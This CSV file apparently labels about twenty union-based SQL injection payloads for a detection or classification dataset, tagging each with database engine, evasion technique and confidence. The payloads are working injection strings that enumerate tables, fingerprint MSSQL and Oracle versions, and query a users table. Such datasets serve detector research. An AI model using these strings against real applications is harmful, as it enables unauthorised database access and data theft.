payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,string_single_quote
) union select * from information_schema.tables;,union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
' union all select @@version--,union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"' union select * from users where login = char ( 114,111,111,116 ) ;",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
' union select,union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
' union ( select @@version ) --,union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"' union ( select NULL, ( select @@version ) ) --",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"' union ( select NULL, NULL, ( select @@version ) ) --",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"' union ( select NULL, NULL, NULL, ( select @@version ) ) --",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"' union ( select NULL, NULL, NULL, NULL, ( select @@version ) ) --",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"' union ( select NULL, NULL, NULL, NULL, NULL, ( select @@version ) ) --",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ( \ ) = 1 union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ( \. ) = 1 union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ( 1 ) = 1 union select 1,banner from v$version where rownum = 1 -- 1",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ( \+ ) = 1 union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or ( $+ ) = 1 union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or \.<1 union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or \.<\ union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or \.<$ union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = 1 or \.< = 1 union select 1,@@VERSION -- 1",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
